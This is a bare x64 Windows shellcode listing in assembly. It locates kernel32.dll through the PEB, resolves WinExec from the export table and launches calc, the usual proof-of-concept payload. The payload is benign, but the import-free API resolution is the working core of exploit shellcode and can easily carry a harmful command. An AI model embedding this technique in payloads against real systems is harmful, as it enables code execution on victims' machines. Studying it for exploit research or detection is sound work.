section .text
	global _start
_start:	
		xor rcx , rcx
		mov rbx , gs:[rcx + 0x60]
		mov rbx , [rbx + 0x18]
		mov rbx , [rbx + 0x20]
		mov rbx , [rbx]
		mov rbx , [rbx]
		mov r8 , [rbx + 0x20]
		
		; r8 = kernel32.dll
		
		mov edx , [r8 + 0x3c]
		lea rdx , [rdx + r8]
		xor ecx , ecx
		mov cl , 0x88
		mov edx , [rdx + rcx]
		lea rdx , [rdx + r8]
		mov esi , [rdx + 0x20]
		lea rsi , [rsi + r8]
		
		
		;rdx = base of Exporttable
		xor rcx , rcx
		Find_next:
		mov eax , [rsi + rcx * 4]
		add rax , r8
	
		cmp dword  [rax] , 0x456e6957
		jnz next
		
		
		cmp word  [rax + 4] , 0x6578
		jnz next
		cmp byte  [rax + 6] , 0x63
		jnz next
		jmp found
		
		next:
		inc rcx
		jmp Find_next
		
		found:
		
		;get ordinal table
		mov esi , [rdx + 0x24]
		add rsi , r8
		movzx ecx , word [rsi + rcx * 2]
		;Get address of WinExec
		mov esi , [rdx + 0x1c]
		movsxd rsi , esi
		add rsi , r8
		mov eax, [rsi + rcx * 4]
		movsxd r9 , eax
		add r9 , r8
		
		;r9 : addres of WinExec
		
		sub rsp , 40
		push 0x6578652e 	;'.exe'
		push 0x636c6163               ; 'calc'
		mov rcx , rsp
		xor rdx , rdx
		inc rdx
		call r9
		
		
		
